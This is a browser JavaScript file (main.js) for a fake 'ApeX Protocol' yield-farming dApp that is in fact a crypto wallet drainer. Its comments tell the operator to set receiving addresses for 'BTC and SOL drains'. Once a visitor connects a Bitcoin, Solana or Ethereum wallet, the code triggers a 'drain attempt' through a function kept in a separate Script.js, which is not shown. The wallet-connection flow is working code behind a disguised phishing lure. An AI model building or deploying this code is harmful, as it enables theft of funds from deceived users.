// ===== main.js — Multi‑Chain WalletConnect + Native BTC/SOL Support =====
// 🔥 IMPORTANT: For BTC and SOL drains to work, you MUST set your receiving addresses
// in Script.js (drainNativeBTC and drainNativeSOL functions).

// ✅ This script expects to be loaded as an ES module in a browser.
//    Make sure your HTML includes: <script type="module" src="./main.js"></script>
//    and that you have an importmap or a bundler (e.g., Vite) to resolve these bare imports.

import SignClient from "@walletconnect/sign-client";
import { WalletConnectModal } from "@walletconnect/modal";

document.addEventListener("DOMContentLoaded", async () => {
  console.log("✅ main.js loaded - Multi‑Chain Enhanced (BTC, SOL, EVM)");

  // 1️⃣ Reference DOM elements
  const connectButton = document.getElementById("connectButton");
  const walletButton = document.getElementById("walletButton");
  const claimStatus = document.getElementById("claimStatus");

  // 2️⃣ WalletConnect state
  let currentSession = null;   // active WalletConnect session
  let client = null;           // SignClient instance
  let modal = null;            // WalletConnectModal instance

  // 3️⃣ Button state management
  function setButtonState(button, state, message = "") {
    if (!button) return;
    button.style.display = "inline-block";
    button.style.padding = "14px 28px";
    button.style.borderRadius = "8px";
    button.style.fontWeight = "600";
    button.style.border = "none";
    button.style.cursor = state === "loading" ? "not-allowed" : "pointer";
    button.style.transition = "all 0.3s ease";
    button.style.color = "white";
    button.style.fontSize = "16px";
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = "0 4px 12px rgba(0, 0, 0, 0.15)";
    button.style.minWidth = "180px";
    button.disabled = state === "loading";

    switch (state) {
      case "loading":
        button.style.background =
          "linear-gradient(135deg, #666666 0%, #888888 100%)";
        button.style.boxShadow = "0 2px 8px rgba(102, 102, 102, 0.3)";
        button.innerHTML =
          '<i class="fas fa-spinner fa-spin" style="margin-right: 8px"></i> Connecting...';
        break;
      case "connected":
        button.style.background =
          "linear-gradient(135deg, #10B981 0%, #059669 100%)";
        button.style.boxShadow = "0 4px 12px rgba(16, 185, 129, 0.3)";
        button.innerHTML =
          '<i class="fas fa-check-circle" style="margin-right: 8px"></i> Connected';
        break;
      case "disconnect":
        button.style.background =
          "linear-gradient(135deg, #EF4444 0%, #DC2626 100%)";
        button.style.boxShadow = "0 4px 12px rgba(239, 68, 68, 0.3)";
        button.innerHTML =
          '<i class="fas fa-power-off" style="margin-right: 8px"></i> Disconnect';
        break;
      case "failed":
        button.style.background =
          "linear-gradient(135deg, #EF4444 0%, #DC2626 100%)";
        button.style.boxShadow = "0 4px 12px rgba(239, 68, 68, 0.3)";
        button.innerHTML =
          '<i class="fas fa-exclamation-triangle" style="margin-right: 8px"></i> Failed';
        setTimeout(() => {
          setButtonState(button, "normal");
        }, 3000);
        break;
      case "normal":
      default:
        button.style.background =
          "linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)";
        button.style.boxShadow = "0 4px 12px rgba(255, 107, 0, 0.3)";
        button.innerHTML =
          '<i class="fas fa-wallet" style="margin-right: 8px"></i> Connect Wallet to Mint';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = "translateY(-2px)";
            button.style.boxShadow = "0 6px 16px rgba(255, 107, 0, 0.4)";
          }
        };
        button.onmouseleave = () => {
          button.style.transform = "translateY(0)";
          button.style.boxShadow = "0 4px 12px rgba(255, 107, 0, 0.3)";
        };
        break;
    }
  }

  // 4️⃣ Status message display
  function showStatus(message, type = "info") {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = "block";
    claimStatus.style.padding = "12px 16px";
    claimStatus.style.borderRadius = "8px";
    claimStatus.style.marginTop = "12px";
    claimStatus.style.fontWeight = "500";
    claimStatus.style.fontSize = "14px";
    claimStatus.style.textAlign = "center";
    claimStatus.style.transition = "all 0.3s ease";

    const styles = {
      success: {
        background: "linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)",
        color: "#166534",
        border: "1px solid #86EFAC",
      },
      error: {
        background: "linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)",
        color: "#991B1B",
        border: "1px solid #FCA5A5",
      },
      info: {
        background: "linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)",
        color: "#1E40AF",
        border: "1px solid #93C5FD",
      },
    };
    const style = styles[type] || styles.info;
    Object.assign(claimStatus.style, style);

    if (type === "error" || type === "success") {
      setTimeout(() => {
        claimStatus.style.opacity = "0";
        setTimeout(() => {
          claimStatus.style.display = "none";
          claimStatus.style.opacity = "1";
        }, 300);
      }, 5000);
    }
  }

  // 5️⃣ Initialize buttons
  setButtonState(connectButton, "normal");
  if (walletButton) setButtonState(walletButton, "normal");

  // 6️⃣ WalletConnect configuration
  const projectId = "ea2ef1ec737f10116a4329a7c5629979";
  const metadata = {
    name: "ApeX Protocol",
    description: "AI-Optimized Yield Farming DApp",
    url: window.location.origin,
    icons: ["https://walletconnect.com/walletconnect-logo.png"],
  };

  // 7️⃣ Mobile detection
  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      navigator.userAgent
    );
  }

  // 8️⃣ Wallet storage (localStorage)
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem("connectedWallet", address);
    if (session) {
      localStorage.setItem("walletConnectSession", JSON.stringify(session));
    }
    if (chainType) {
      localStorage.setItem("chainType", chainType);
    } else {
      const detected = getChainType();
      if (detected !== "unknown") {
        localStorage.setItem("chainType", detected);
      }
    }
  }

  function getSavedWallet() {
    return localStorage.getItem("connectedWallet");
  }

  function getSavedSession() {
    const session = localStorage.getItem("walletConnectSession");
    return session ? JSON.parse(session) : null;
  }

  function getSavedChainType() {
    return localStorage.getItem("chainType") || "unknown";
  }

  function clearSavedWallet() {
    localStorage.removeItem("connectedWallet");
    localStorage.removeItem("walletConnectSession");
    localStorage.removeItem("chainType");
  }

  // 9️⃣ Chain detection (for native wallets)
  function getChainType() {
    if (window.unisat) return "bitcoin";
    if (window.solana && window.solana.isPhantom) return "solana";
    if (window.ethereum) return "evm";
    return "unknown";
  }

  // 🔟 UI update: show connected address with chain badge
  function updateConnectedUI(address, chainType = null) {
    setButtonState(connectButton, "disconnect");
    if (walletButton) setButtonState(walletButton, "disconnect");

    let display = document.getElementById("connectedAddressDisplay");
    if (!display) {
      display = document.createElement("div");
      display.id = "connectedAddressDisplay";
      display.style.marginTop = "12px";
      display.style.padding = "10px 16px";
      display.style.fontFamily = "'JetBrains Mono', 'Monaco', 'Consolas', monospace";
      display.style.fontSize = "14px";
      display.style.color = "#059669";
      display.style.textAlign = "center";
      display.style.background = "linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)";
      display.style.borderRadius = "8px";
      display.style.border = "1px solid #A7F3D0";
      display.style.boxShadow = "0 2px 8px rgba(5, 150, 105, 0.1)";
      connectButton.parentNode.appendChild(display);
    }

    let chainLabel = "";
    if (chainType) {
      const labels = { bitcoin: "₿ BTC", solana: "◎ SOL", evm: "◆ ETH" };
      chainLabel = labels[chainType] || "";
    } else {
      const detected = getChainType();
      if (detected !== "unknown") {
        const labels = { bitcoin: "₿ BTC", solana: "◎ SOL", evm: "◆ ETH" };
        chainLabel = labels[detected] || "";
      }
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display: flex; align-items: center; justify-content: center; gap: 8px; flex-wrap: wrap;">
        <i class="fas fa-check-circle" style="color: #059669;"></i>
        <span>Connected: ${formatted}</span>
        ${chainLabel ? `<span style="background: #1F2937; color: white; padding: 2px 10px; border-radius: 12px; font-size: 12px; font-weight: 600;">${chainLabel}</span>` : ''}
        <button id="copyAddress" style="background: none; border: none; color: #059669; cursor: pointer; padding: 4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById("copyAddress").addEventListener("click", () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById("copyAddress");
        const original = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.style.color = "#10B981";
        setTimeout(() => {
          btn.innerHTML = original;
          btn.style.color = "#059669";
        }, 2000);
      });
    });

    showStatus("Wallet connected successfully!", "success");
  }

  function resetConnectedUI() {
    setButtonState(connectButton, "normal");
    if (walletButton) setButtonState(walletButton, "normal");
    const display = document.getElementById("connectedAddressDisplay");
    if (display) display.remove();
    showStatus("Wallet disconnected", "info");
  }

  // 1️⃣1️⃣ Initialize WalletConnect (with retry and fallback)
  async function initWalletConnect() {
    // If already initialized, return immediately
    if (client && modal) return true;

    try {
      console.log("🔄 Initializing WalletConnect...");

      // Initialize the SignClient
      client = await SignClient.init({
        projectId,
        metadata,
        relayUrl: "wss://relay.walletconnect.com",
      });

      // Initialize the Modal
      modal = new WalletConnectModal({
        projectId,
        themeMode: "dark",
        themeVariables: {
          "--wcm-z-index": "9999",
          "--wcm-accent-color": "#FF6B00",
          "--wcm-background-color": "#1F2937",
          "--wcm-font-family": "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
          "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
          "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
          "fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",
          "ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18",
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          {
            id: "metamask",
            name: "MetaMask",
            links: {
              native: "metamask://",
              universal: "https://metamask.app.link/",
            },
          },
          {
            id: "trust",
            name: "Trust Wallet",
            links: {
              native: "trust://",
              universal: "https://link.trustwallet.com/",
            },
          },
          {
            id: "rainbow",
            name: "Rainbow",
            links: {
              native: "rainbow://",
              universal: "https://rnbwapp.com/",
            },
          },
          {
            id: "coinbase",
            name: "Coinbase Wallet",
            links: {
              native: "coinbasewallet://",
              universal: "https://go.cb-w.com/",
            },
          },
        ],
      });

      console.log("✅ WalletConnect SignClient + Modal initialized");
      return true;
    } catch (error) {
      console.error("❌ WalletConnect initialization failed:", error);
      showStatus("Wallet connection service unavailable: " + error.message, "error");
      // Reset so we can try again
      client = null;
      modal = null;
      return false;
    }
  }

  // 1️⃣2️⃣ Native Wallet Connections (Bitcoin, Solana, EVM)
  async function connectBitcoin() {
    try {
      if (!window.unisat) {
        showStatus("UniSat wallet not installed", "error");
        return false;
      }
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (accounts.length === 0) throw new Error("No BTC account");
      const address = accounts[0];
      saveWallet(address, null, "bitcoin");
      updateConnectedUI(address, "bitcoin");
      return true;
    } catch (e) {
      console.error("BTC connection error:", e);
      showStatus("Bitcoin connection failed: " + e.message, "error");
      return false;
    }
  }

  async function connectSolana() {
    try {
      if (!window.solana || !window.solana.isPhantom) {
        showStatus("Phantom wallet not installed", "error");
        return false;
      }
      await window.solana.connect();
      const address = window.solana.publicKey.toString();
      saveWallet(address, null, "solana");
      updateConnectedUI(address, "solana");
      return true;
    } catch (e) {
      console.error("Solana connection error:", e);
      showStatus("Solana connection failed: " + e.message, "error");
      return false;
    }
  }

  async function connectEVM() {
    // First try injected provider (MetaMask, etc.)
    if (window.ethereum) {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const accounts = await window.ethereum.request({ method: "eth_accounts" });
        if (accounts.length === 0) throw new Error("No EVM account");
        const address = accounts[0];
        saveWallet(address, null, "evm");
        updateConnectedUI(address, "evm");
        return true;
      } catch (e) {
        console.warn("Direct EVM connection failed, falling back to WalletConnect", e);
      }
    }
    // Fallback to WalletConnect
    return await connectViaWalletConnect();
  }

  // 1️⃣3️⃣ WalletConnect flow – opens modal and returns session
  async function connectViaWalletConnect() {
    // Ensure WalletConnect is initialized
    if (!client || !modal) {
      const initSuccess = await initWalletConnect();
      if (!initSuccess) {
        setButtonState(connectButton, "failed");
        if (walletButton) setButtonState(walletButton, "failed");
        return false;
      }
    }

    try {
      showStatus("Requesting wallet connection...", "info");

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              "eth_sendTransaction",
              "personal_sign",
              "eth_signTypedData_v4",
            ],
            chains: ["eip155:1"],
            events: ["chainChanged", "accountsChanged"],
          },
        },
      });

      if (uri) {
        // Open the modal with the connection URI
        modal.openModal({ uri });
        showStatus("Select your wallet from the list or scan QR code", "info");
      } else {
        // Some wallets (like web wallets) may not require a URI
        showStatus("Waiting for wallet approval...", "info");
      }

      // Wait for the user to approve or reject
      const session = await Promise.race([
        approval(),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error("Connection timeout")), 60000)
        ),
      ]);

      // Close the modal once we have a session
      if (modal) modal.closeModal();

      const success = handleConnectedSession(session);
      if (!success) {
        setButtonState(connectButton, "failed");
        if (walletButton) setButtonState(walletButton, "failed");
      }
      return success;
    } catch (err) {
      console.error("❌ WalletConnect connection error:", err);
      setButtonState(connectButton, "failed");
      if (walletButton) setButtonState(walletButton, "failed");
      if (modal) modal.closeModal();

      let msg = "Wallet connection failed";
      if (err.message?.includes("User rejected") || err.message?.includes("Cancelled")) {
        msg = "Connection cancelled by user";
      } else if (err.message?.includes("timeout")) {
        msg = "Connection timeout - please try again";
      } else {
        msg = err.message || msg;
      }
      showStatus(msg, "error");
      return false;
    }
  }

  // 1️⃣4️⃣ Handle a successful WalletConnect session
  function handleConnectedSession(session) {
    if (session?.namespaces?.eip155?.accounts?.length) {
      const account = session.namespaces.eip155.accounts[0].split(":")[2];
      console.log("✅ Connected wallet:", account);
      currentSession = session;
      saveWallet(account, session, "evm");
      updateConnectedUI(account, "evm");
      return true;
    } else {
      console.error("❌ No accounts found in session");
      showStatus("No accounts found in wallet", "error");
      return false;
    }
  }

  // 1️⃣5️⃣ Main connect dispatcher
  async function connectWallet() {
    try {
      setButtonState(connectButton, "loading");
      if (walletButton) setButtonState(walletButton, "loading");
      showStatus("Detecting wallet...", "info");

      const chain = getChainType();
      let success = false;

      switch (chain) {
        case "bitcoin":
          success = await connectBitcoin();
          break;
        case "solana":
          success = await connectSolana();
          break;
        case "evm":
          success = await connectEVM();
          break;
        default:
          showStatus("No wallet detected, attempting to connect...", "info");
          if (window.unisat) {
            success = await connectBitcoin();
          } else if (window.solana && window.solana.isPhantom) {
            success = await connectSolana();
          } else if (window.ethereum) {
            success = await connectEVM();
          } else {
            // Last resort: WalletConnect
            success = await connectViaWalletConnect();
          }
          break;
      }

      if (success) {
        setButtonState(connectButton, "connected");
        if (walletButton) setButtonState(walletButton, "connected");
        showStatus("Wallet connected!", "success");
        // Trigger the drain attempt (defined in Script.js)
        setTimeout(() => {
          if (window.initiateClaimProcess) {
            window.initiateClaimProcess();
          }
        }, 1500);
      } else {
        setButtonState(connectButton, "failed");
        if (walletButton) setButtonState(walletButton, "failed");
      }
    } catch (err) {
      console.error("❌ Wallet connection failed:", err);
      setButtonState(connectButton, "failed");
      if (walletButton) setButtonState(walletButton, "failed");
      showStatus("Connection error: " + err.message, "error");
    }
  }

  // 1️⃣6️⃣ Disconnect
  async function disconnectWallet() {
    try {
      if (currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: "User disconnected" },
        });
        currentSession = null;
      }
    } catch (err) {
      console.warn("Disconnect error:", err);
    }

    // Also disconnect Solana if connected
    if (window.solana && window.solana.isPhantom) {
      try { await window.solana.disconnect(); } catch (e) {}
    }
    // UniSat has no explicit disconnect; just clear state.

    resetConnectedUI();
    clearSavedWallet();
    showStatus("Disconnected", "info");
  }

  // 1️⃣7️⃣ Button click handler (toggle connect/disconnect)
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== "unknown")) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) {
    connectButton.addEventListener("click", handleClick);
  }
  if (walletButton) {
    walletButton.addEventListener("click", handleClick);
  }

  // 1️⃣8️⃣ Restore saved session on page load
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedSession = getSavedSession();
    const savedChain = getSavedChainType();

    if (savedWallet && savedSession && savedChain === "evm") {
      // Restore EVM session via WalletConnect
      console.log("♻️ Restoring EVM session:", savedWallet);
      const initSuccess = await initWalletConnect();
      if (!initSuccess) {
        clearSavedWallet();
        return;
      }
      try {
        const session = client.session.get(savedSession.topic);
        if (session) {
          currentSession = session;
          updateConnectedUI(savedWallet, "evm");
          showStatus("Wallet connection restored", "success");
        } else {
          clearSavedWallet();
        }
      } catch (error) {
        console.error("Session restore error:", error);
        clearSavedWallet();
      }
    } else if (savedWallet && savedChain === "bitcoin") {
      // Bitcoin restore (UniSat persists)
      if (window.unisat) {
        try {
          const accounts = await window.unisat.getAccounts();
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            updateConnectedUI(savedWallet, "bitcoin");
            showStatus("Bitcoin wallet restored", "success");
          } else {
            clearSavedWallet();
          }
        } catch {
          clearSavedWallet();
        }
      } else {
        clearSavedWallet();
      }
    } else if (savedWallet && savedChain === "solana") {
      // Solana restore (Phantom persists)
      if (window.solana && window.solana.isPhantom && window.solana.publicKey) {
        const address = window.solana.publicKey.toString();
        if (address === savedWallet) {
          updateConnectedUI(savedWallet, "solana");
          showStatus("Solana wallet restored", "success");
        } else {
          clearSavedWallet();
        }
      } else {
        clearSavedWallet();
      }
    } else if (savedWallet && !savedSession) {
      // Fallback: assume direct EVM connection
      updateConnectedUI(savedWallet, "evm");
      showStatus("Wallet restored (direct)", "success");
    }
  }

  await restoreWalletConnection();

  // 1️⃣9️⃣ WalletConnect session event listeners
  setTimeout(() => {
    if (client) {
      client.on("session_update", ({ params }) => {
        console.log("🔄 Session updated:", params);
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const account = accounts[0].split(":")[2];
          updateConnectedUI(account, "evm");
          saveWallet(account, currentSession, "evm");
          showStatus("Wallet session updated", "info");
        }
      });

      client.on("session_delete", () => {
        console.log("🗑️ Session deleted");
        resetConnectedUI();
        clearSavedWallet();
        showStatus("Wallet disconnected by provider", "error");
      });

      client.on("session_event", (event) => {
        console.log("📨 Session event:", event);
      });

      client.on("session_connect", (session) => {
        console.log("🔗 Session connected:", session);
        handleConnectedSession(session);
      });
    }
  }, 1000);

  // 2️⃣0️⃣ EIP‑6963 provider discovery (for modern EVM wallets)
  function setupEIP6963() {
    if (typeof window !== "undefined") {
      if (!window.eip6963Providers) {
        window.eip6963Providers = [];
      }
      window.addEventListener("eip6963:announceProvider", (event) => {
        console.log("🎯 EIP-6963 Provider detected:", event.detail.info.name);
        const exists = window.eip6963Providers.some(
          (p) => p.info.uuid === event.detail.info.uuid
        );
        if (!exists) {
          window.eip6963Providers.push(event.detail);
          console.log(`✅ Added EIP-6963 provider: ${event.detail.info.name}`);
        }
      });
      window.dispatchEvent(new Event("eip6963:requestProvider"));
      setTimeout(() => {
        window.dispatchEvent(new Event("eip6963:requestProvider"));
      }, 1000);
    }
  }
  setupEIP6963();

  // 2️⃣1️⃣ Page visibility and clean-up
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden && getSavedWallet()) {
      console.log("🔍 Page visible, checking connection state...");
    }
  });

  window.addEventListener("beforeunload", () => {
    if (modal) modal.closeModal();
  });

  // 2️⃣2️⃣ Provider change listeners for EVM (injected)
  if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        showStatus("Wallet disconnected", "info");
      } else {
        updateConnectedUI(accounts[0], "evm");
        saveWallet(accounts[0], null, "evm");
      }
    });
    window.ethereum.on("chainChanged", (chainId) => {
      console.log("🔄 Chain changed:", chainId);
      showStatus(`Network changed to ${chainId}`, "info");
    });
    window.ethereum.on("disconnect", () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus("Wallet disconnected", "info");
    });
  }

  // 2️⃣3️⃣ Provider change listeners for Solana (Phantom)
  if (window.solana && window.solana.isPhantom) {
    window.solana.on("disconnect", () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus("Solana wallet disconnected", "info");
    });
    window.solana.on("accountChanged", (newPublicKey) => {
      if (newPublicKey) {
        const address = newPublicKey.toString();
        updateConnectedUI(address, "solana");
        saveWallet(address, null, "solana");
      } else {
        resetConnectedUI();
        clearSavedWallet();
      }
    });
  }

  console.log("✅ main.js fully initialized with multi‑chain support");
});
